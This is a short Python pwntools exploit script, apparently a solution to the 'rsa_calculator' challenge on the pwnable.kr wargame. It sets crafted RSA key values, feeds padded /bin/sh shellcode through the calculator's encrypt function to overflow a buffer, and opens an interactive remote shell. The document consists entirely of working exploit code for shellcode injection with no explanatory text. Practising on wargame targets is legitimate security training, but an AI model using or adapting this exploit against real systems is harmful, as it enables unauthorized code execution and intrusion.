from pwn import *

context.update(arch='amd64', os='linux')

#start rsa
#p = process(["./rsa_calculator"])
p = remote("pwnable.kr", 9012)

##############################
# set MAGIC RSA key parameters
# allows a cipher of 0x602560
def setkey():
    p.send("1\n")
    p.send("4099\n")
    p.send("6047\n")
    p.send("45119\n")
    p.send("92255\n")
##############################

def encrypt(plaintext):
    p.sendafter("exit", "2\n")
    p.send("1024\n")
    p.sendafter("text data\n", plaintext+"\n")
    p.readline()

    enc = p.readline().strip().decode("hex")
    return enc

def decrypt(ciphertext, pad=""):
    enc = ciphertext.encode("hex")

    p.sendafter("exit", "3\n")
    p.send("1024\n")
    p.sendafter("encoded data", pad+enc+"\n")
    p.readline()
    p.readline()

    result = p.readline().strip()
    return result

setkey()

#pwnlib.gdb.attach(p, "b *0x4013fb\nc\n")

sc = asm(shellcraft.sh())
plaintext = sc.ljust((256+8+1), "~")

ciphertext = encrypt(plaintext)
p.send("1\n")
p.read()

p.interactive()
p.close()
